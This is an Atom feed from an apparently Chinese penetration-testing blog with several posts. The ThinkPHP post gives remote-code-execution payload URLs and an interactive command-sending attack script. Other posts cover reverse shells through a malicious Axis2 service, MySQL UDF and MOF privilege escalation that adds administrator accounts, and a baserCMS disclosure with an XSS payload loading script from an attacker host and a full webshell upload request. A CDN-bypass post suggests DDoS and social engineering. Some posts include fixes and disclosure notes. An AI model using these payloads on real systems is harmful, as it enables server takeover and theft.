<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuNu11&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sunu11.com/"/>
  <updated>2018-12-26T03:04:58.619Z</updated>
  <id>http://sunu11.com/</id>
  
  <author>
    <name>SuNu11</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从thinkphp远程代码执行开始</title>
    <link href="http://sunu11.com/2018/12/12/24/"/>
    <id>http://sunu11.com/2018/12/12/24/</id>
    <published>2018-12-12T12:58:44.000Z</published>
    <updated>2018-12-26T03:04:58.619Z</updated>
    
    <content type="html"><![CDATA[<p>9号晚上thinkphp官网发布安全更新:<a href="https://blog.thinkphp.cn/869075" target="_blank" rel="external">https://blog.thinkphp.cn/869075</a><br>修复了一处代码执行漏洞，影响没有开启强制路由的5.0 – V5.0.23版本与5.1 – V5.1.31版本thinkphp 开发站点。，简单记录一下近两天一些信息与心得。<a id="more"></a></p><h3 id="thinkphp代码执行漏洞"><a href="#thinkphp代码执行漏洞" class="headerlink" title="thinkphp代码执行漏洞"></a>thinkphp代码执行漏洞</h3><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>到现在这个点相信各大厂商都的waf都可以拦截这个攻击了，包括我司23333。之所以存在漏洞，关键在于框架对控制器名没有进行足够的检测，从补丁也能看出来。<br>贴漏洞产生的部分关键代码：<br>从下述代码可知，在当$name包含\则将其作为类名，如果$name可控，是可以实例化任何一个类的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">protected function parseModuleAndClass($name, $layer, $appendSuffix)</div><div class="line">   &#123;   echo &apos;parseModuleAndClass:&apos;.$name.&quot;&lt;br&gt;&quot;;</div><div class="line">       if (false !== strpos($name, &apos;\\&apos;)) &#123; </div><div class="line">           $class  = $name;</div><div class="line"></div><div class="line">           $module = $this-&gt;request-&gt;module();</div><div class="line">       &#125;</div></pre></td></tr></table></figure><p>而$name可控且\没被过滤，因此可以通过s=index/\think\Container/invokefunction的方式调用think\Container这个命名空间下的invokefunction函数。从而实现命令执行。</p><h4 id="poc："><a href="#poc：" class="headerlink" title="poc："></a><em>poc</em>：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</div><div class="line">?s=index/\think\Request/input&amp;filter=system&amp;data=id</div><div class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</div><div class="line">?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</div><div class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div><div class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div><div class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</div><div class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</div><div class="line">?s=index/think\config/get&amp;name=database.password</div></pre></td></tr></table></figure><h4 id="检测脚本："><a href="#检测脚本：" class="headerlink" title="检测脚本："></a>检测脚本：</h4><p>避免其他问题，暂放一个github上的简单测试脚本：attack.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#author: ctudoudou</div><div class="line">from requests import get</div><div class="line">from argparse import ArgumentParser</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    parser = ArgumentParser(prog=&apos;Test poc&apos;, usage=&apos;./attack.py [options: -u] &lt;url&gt;&apos;,</div><div class="line">                            description=&quot;The ThinkPHP test script&quot;)</div><div class="line"></div><div class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, help=&quot;attack url&quot;)</div><div class="line"></div><div class="line">    args = parser.parse_args()</div><div class="line"></div><div class="line">    while (True):</div><div class="line">        url = &apos;&#123;&#125;?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&apos; \</div><div class="line">              &apos;&amp;vars[0]=system&amp;vars[1][]=&apos;.format(args.url)#可继续添加其他poc</div><div class="line">        command = input(&quot;shell$ &quot;)</div><div class="line">        if command != &quot;exit&quot;:</div><div class="line">            payload = url + str(command)</div><div class="line">            r = get(payload)</div><div class="line">            print(r.text)</div><div class="line">        else:</div><div class="line">            break</div></pre></td></tr></table></figure></p><p>自己简单写了一个综合检测的脚本：<br>github: <a href="https://github.com/sunu11/thinkphpv5" target="_blank" rel="external">https://github.com/sunu11/thinkphpv5</a></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>官方现已推出补丁 建议开发者进行修复<br>Thinkphp v5.0.x补丁地址: <a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="external">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a><br>Thinkphp v5.1.x补丁地址: <a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="external">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a><br>另外像这种漏洞是存在攻击特征的，基于正则的waf也可以进行拦截，因此有装了waf的升级规则库可保无碍，没安装的git pull 官方代码应该也还ok。关键是及时发现，及时处理。</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>1、phpmyadmin 官网也更新了，修复了三枚漏洞，文件包含、csrf、xss，可以及时关注一下。<a href="https://www.t00ls.net/articles-48952.html" target="_blank" rel="external">https://www.t00ls.net/articles-48952.html</a><br>2、偶像Orange Tsai发了一条Twitter：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">After weeks of diving into a single 500mb idb file. Finally chained a pre-auth RCE in a popular SSL VPN! 🙌</div></pre></td></tr></table></figure></p><p>静候233333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;9号晚上thinkphp官网发布安全更新:&lt;a href=&quot;https://blog.thinkphp.cn/869075&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.thinkphp.cn/869075&lt;/a&gt;&lt;br&gt;修复了一处代码执行漏洞，影响没有开启强制路由的5.0 – V5.0.23版本与5.1 – V5.1.31版本thinkphp 开发站点。，简单记录一下近两天一些信息与心得。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="thinkphp" scheme="http://sunu11.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>其他分享的一些东西</title>
    <link href="http://sunu11.com/2018/11/28/ohters/"/>
    <id>http://sunu11.com/2018/11/28/ohters/</id>
    <published>2018-11-28T05:32:38.000Z</published>
    <updated>2018-12-26T02:52:52.532Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，方便以后查询。<a id="more"></a></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>ucms1.4.5后台sql注入漏洞 <a href="https://www.t00ls.net/thread-48432-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-48432-1-1.html</a><br>DedeCMS V5.7 SP2前台文件上传(需要后台权限CVE-2018-20129)复现分析 <a href="https://www.t00ls.net/thread-49086-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-49086-1-1.html</a></p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>H1 CTF Writeup(简单翻译）<a href="https://www.t00ls.net/thread-48659-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-48659-1-1.html</a><br>网鼎杯部分题writeup <a href="https://topsec.wiki/36t9aJda/?thread-495.htm" target="_blank" rel="external">https://topsec.wiki/36t9aJda/?thread-495.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下，方便以后查询。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Axis2恶意部署getshell</title>
    <link href="http://sunu11.com/2018/11/03/Axis2%E6%81%B6%E6%84%8F%E9%83%A8%E7%BD%B2getshell/"/>
    <id>http://sunu11.com/2018/11/03/Axis2恶意部署getshell/</id>
    <published>2018-11-03T13:42:06.000Z</published>
    <updated>2018-11-10T12:11:18.078Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>以前遇到的，记录一下，便于以后查阅 <a id="more"></a></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>一般默认的账号是admin密码是axis2，登陆后：点击upload service<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-1.png" alt="1"><br>上传cat.aar文件，可看到上传成功。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-2.png" alt="2"><br>点击Available Services可选择可用的功能。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-3.png" alt="3"><br>主要功能有：<br>1、getClassPath<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-4.png" alt="4"><br>2、执行命令：<br>参数:<br><code>cmd=xxx</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-5.png" alt="5"><br>3、反弹shell：<br><code>https://192.168.86.254:8443/axis2/services/Cat/shell?host=x.x.x.x&amp;port=x</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-6.png" alt="6"><br>4、写入shell或是写入文件<br><code>https://192.168.86.254:8443/axis2/services/Cat/writeStringToFile?data=数据&amp;file=文件路径&amp;encoding=utf-8&amp;append=false</code></p><p>详细过程请参考：<a href="http://p2j.cn/?p=1533" target="_blank" rel="external">http://p2j.cn/?p=1533</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;以前遇到的，记录一下，便于以后查阅
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="axis2" scheme="http://sunu11.com/tags/axis2/"/>
    
      <category term="中间件" scheme="http://sunu11.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>如果获取站点真实ip</title>
    <link href="http://sunu11.com/2018/11/03/%E5%A6%82%E6%9E%9C%E8%8E%B7%E5%8F%96%E7%AB%99%E7%82%B9%E7%9C%9F%E5%AE%9Eip/"/>
    <id>http://sunu11.com/2018/11/03/如果获取站点真实ip/</id>
    <published>2018-11-03T13:16:00.000Z</published>
    <updated>2018-11-10T12:09:27.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>说到渗透测试，肯定有信息收集；信息收集就涉及服务器ip信息。而通常大型站点都通过了cdn、代理等手段隐藏。本文对这个老话题作一下个人的思路以及姿势总结。<a id="more"></a></p><h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>1、对于存在注册或者留言等能够让站点通过邮件联系的网站，通常可以通过站点发送的邮件找到服务器的真实ip，如bilibili.com：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-1.png" alt="1"><br>此方法是因为通常大部分公用SMTP服务在发信时邮件头会带上发件者ip，cdn的防护对这种方式完全没作用。解决方式可以参考此链接：<a href="https://www.v2ex.com/t/276788" target="_blank" rel="external">https://www.v2ex.com/t/276788</a><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-2.png" alt="2"><br>2、nslookup命令：对于bilibili.com 该方式同样实用，因为存在MX记录：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-3.png" alt="3"><br>也可以查找NS、TXT等其他记录进行真实ip的查找。另外还可以使用国外冷门的dns解析域名：nslookup xxx.com y.y.y.y  如果运气好，找到直接解析到服务器真实ip的dns服务器。一查就出来了。<br>3、Ping：找二级域名，通过ping将网站的二级域名的ip逐个与目标域名相匹配，直到访问成功即可，还有ping秃域名(如对于www.baidu.com，对于ping baidu.com就是ping秃域名)，这类方式都是看管理员粗不粗心，如果能找到管理员没有使用cdn的域名，就能找到真实ip了。同样因为很多国内的CDN没有节点对国外服务，也可以使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a><br>4、通过网站的缺陷与漏洞,比如寻找网站上的探针：phpinfo等，寻找网站上的xss、os injection、ssrf等一切可以让服务器主动访问我的vps的漏洞，并成功利用。通过查看日志或者vps的请求记录就能看到真实ip。<br>5、通过大量信息收集，如通过其他第三方网站查看域名历史解析记录、域名历史信息历史漏洞或者二级域名等然后利用这些获取到的信息进行进一步的ip查找（灵活使用），这下面是常用的几个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">https://bgp.he.net </div><div class="line">https://toolbar.netcraft.com/site_report?url=www.xxx.com</div><div class="line">http://www.17ce.com</div><div class="line">http://www.crimeflare.com/</div><div class="line">https://domainbigdata.com/goodmbi.com</div><div class="line">https://crt.sh/</div><div class="line">http://wooyun.jozxing.cc/</div><div class="line">https://fofa.so/</div></pre></td></tr></table></figure><p>最后的fofa是网上学到的姿势之一，通过fofa的HTML源代码检索，复制网页title或者其他信息放fofa进行检索，5173.com可以通过该方法找到真实ip但是前两天我需要查找源ip的网址使用该方法无效，此方法建立在通过fofa能检索到并且html标识够独特的基础下，个人感觉在没有思路的时候也可以试试，有待下一次实践。贴一张图：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-4.png" alt="4"><br>6、其他没尝试过的姿势：社工到cdn账号密码，怼进去看配置；zmap扫全网，匹配站点信息追溯真实ip；DDOS，把cdn打穿就会回源；通过DNS社工库，找对应的解析记录。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;说到渗透测试，肯定有信息收集；信息收集就涉及服务器ip信息。而通常大型站点都通过了cdn、代理等手段隐藏。本文对这个老话题作一下个人的思路以及姿势总结。
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="信息收集" scheme="http://sunu11.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="fofa" scheme="http://sunu11.com/tags/fofa/"/>
    
  </entry>
  
  <entry>
    <title>mysql两种经典提权方式</title>
    <link href="http://sunu11.com/2018/11/03/%E7%BB%8F%E5%85%B8%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95/"/>
    <id>http://sunu11.com/2018/11/03/经典提权方式记录/</id>
    <published>2018-11-03T11:47:30.000Z</published>
    <updated>2018-11-10T12:12:10.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>条件：<br>1、系统版本（Windows2000，XP,Win2003);<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限。<br>3、具有root账号密码<a id="more"></a><br>首先导出udf：<br>MYSQL5.1以上版本，需要把udf.dll文件存放到MSYSQL安装目录下的lib\plugin文件夹下。<br>在mysql命令行输入：<br><figure class="highlight plain"><figcaption><span>@@basedir</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%plugins%&apos;</div></pre></td></tr></table></figure></p><p>然后提权：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create function cmdshell returns string soname &apos;udf.dll&apos;</div><div class="line">select cmdshell(&apos;net user xxx xxx /add&apos;);</div><div class="line">select cmdshell (&apos;net localgroup administrators xxx /add&apos;);</div><div class="line"></div><div class="line">drop function cmdshell;</div></pre></td></tr></table></figure></p><p>**<code>returns string soname ‘导出的DLL路径’</code></p><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>以下为创建xxx用户的mof文件，使用sql执行load_file及into dumpfile 把文件导出到正确位置，执行即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</div><div class="line"> </div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</div><div class="line">    Name  = &quot;filtP2&quot;;</div><div class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</div><div class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</div><div class="line">            &quot;And TargetInstance.Second = 5&quot;;</div><div class="line">    QueryLanguage = &quot;WQL&quot;;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = &quot;consPCSV2&quot;;</div><div class="line">    ScriptingEngine = &quot;JScript&quot;;</div><div class="line">    ScriptText =</div><div class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxx xxx /add\&quot;)&quot;;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">    Consumer   = $Consumer;</div><div class="line">    Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>执行sql命令：<br><code>select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;</code>;</p><p>在可控数据库的情况下也可以直接写入：<br><code>select char(将上述exp asc编码写入) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;;</code></p><p>以上均为新建账号，还需要修改代码将xxx用户加入administrators，重新写入一遍即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;udf提权&quot;&gt;&lt;a href=&quot;#udf提权&quot; class=&quot;headerlink&quot; title=&quot;udf提权&quot;&gt;&lt;/a&gt;udf提权&lt;/h3&gt;&lt;p&gt;条件：&lt;br&gt;1、系统版本（Windows2000，XP,Win2003);&lt;br&gt;2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限。&lt;br&gt;3、具有root账号密码
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="提权" scheme="http://sunu11.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="mysql" scheme="http://sunu11.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>baserCMS 漏洞披漏</title>
    <link href="http://sunu11.com/2018/10/31/baserCMS/"/>
    <id>http://sunu11.com/2018/10/31/baserCMS/</id>
    <published>2018-10-31T09:07:23.000Z</published>
    <updated>2018-11-28T04:58:17.163Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>baserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。<a id="more"></a></p><p>オープンソース・フレームワーク「CakePHP」をベースとしているので、カスタマイズ性、メンテナンス性が高いのが特徴です。</p><p>ツリー構造により固定ページ、ブログ、フォームをまとめて管理できる、強力なコンテンツ管理機能を持つCMSです。Webサイトに最低限必要となるメールフォームや新着ブログなどのプラグインや管理画面の枠組みを最初から装備しており、スマートフォンにも標準対応しています。</p><p>マニュアルやソースコードのコメントにおいて日本語を標準としているのも国産CMSの強みです。  ———— it’s copy from <a href="https://basercms.net/about/index.html" target="_blank" rel="external">https://basercms.net/about/index.html</a></p><p>I found two vulnerability in basicCMS 4.1.3.</p><h3 id="storage-xss-vulnerability（fixed）"><a href="#storage-xss-vulnerability（fixed）" class="headerlink" title="storage xss vulnerability（fixed）"></a>storage xss vulnerability（fixed）</h3><p>There is a storage xss vulnerability in the category name editor after login with normal administrator privileges.</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>We register two administrator accounts with different permissions：システム管理 and サイト運営<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png" alt="图1"><br>Log in to the system using サイト運営 privileged account root:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-2.png" alt="图2"><br>In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-3.png" alt="图3"><br>After the administrator logs in, accessing the page triggers:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-4.png" alt="图4"><br>So，We can insert malicious javascript according to the vulnerability to override the administrator function.<br>For example<br>The root user does not have permission to access<br>“<a href="http://127.0.0.1/basercms/admin/site_configs/del_cache”" target="_blank" rel="external">http://127.0.0.1/basercms/admin/site_configs/del_cache”</a> to delete the server cache information:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-5.png" alt="图5"><br>We can exploit this vulnerability to implement an attack:<br>Since the <strong><code>data[UploaderCategory][name]</code></strong> parameter has a length limit, We can insert the following statement first:<br><code>&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;</code><br>Then, 1.js uses ajax to write a get request to<br><code>http://127.0.0.1/basercms/admin/site_configs/del_cache</code>:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-6.png" alt="图6"><br>Verify: The root (asda)user refreshes the page:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-7.png" alt="图7"><br>And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-8.png" alt="图8"><br>Finally, I found the corresponding code with defects.<br>UploaderCategoriesController.php<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-9.png" alt="图9"><br>It was found that the カテゴリ名（<strong><code>data[UploaderCategory][name]</code></strong>）parameter submitted by the user did not filter the malicious characters,</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h4><p>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/news/archives/574" target="_blank" rel="external">Announcement address</a></p><h3 id="Code-Execution-Vulnerability（fixed）"><a href="#Code-Execution-Vulnerability（fixed）" class="headerlink" title="Code Execution Vulnerability（fixed）"></a>Code Execution Vulnerability（fixed）</h3><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>Download the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly.</p><p>In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-10.png" alt="图10"><br>We can seen move_uploaded_file method，Then audit code，It can be seen that the image is saved here and the suffix is not verified.，Only limited the image name (logo)，So you can get server permissions by uploading php webshell.<br>Poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">POST /basercms/admin/theme_configs/form HTTP/1.1</div><div class="line">Host: 127.0.0.1</div><div class="line">Content-Length: 3986</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://127.0.0.1/basercms/admin/theme_configs/form</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</div><div class="line">Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2</div><div class="line">Connection: close</div><div class="line"></div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;_method&quot;</div><div class="line"></div><div class="line">POST</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;</div><div class="line"></div><div class="line">65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;</div><div class="line"></div><div class="line">e371e3</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;</div><div class="line"></div><div class="line">21b537</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;</div><div class="line"></div><div class="line">1808f5</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;</div><div class="line"></div><div class="line">ed8815</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;</div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_GET[cc]);  ?&gt;</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;</div><div class="line"></div><div class="line">baserCMS</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;</div><div class="line">...</div></pre></td></tr></table></figure></p><p>Then according to the code description, you can get the webshell path:<br><a href="http://127.0.0.1/basercms/files/theme_configs/logo.php" target="_blank" 